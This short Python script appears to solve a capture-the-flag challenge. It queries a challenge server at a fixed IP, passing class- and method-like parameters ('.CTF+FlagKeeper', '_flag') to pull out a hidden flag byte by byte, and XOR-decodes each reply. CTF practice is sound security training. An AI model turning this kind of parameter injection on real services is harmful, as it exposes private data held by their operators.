from requests import *

if __name__ == '__main__':

    url = "http://54.93.193.57/challenge/CTF"


    flag = ""
    for i in range(255):
        try:
            params = {
                "i": i,
                "a":"WTF",
                "b":".CTF+FlagKeeper",
                "c":"_flag"
            }

            r = get(url, params=params)
            o = chr(int(r.text) ^ i)

            flag += o
        except: break

    print("Flag: {}".format(flag))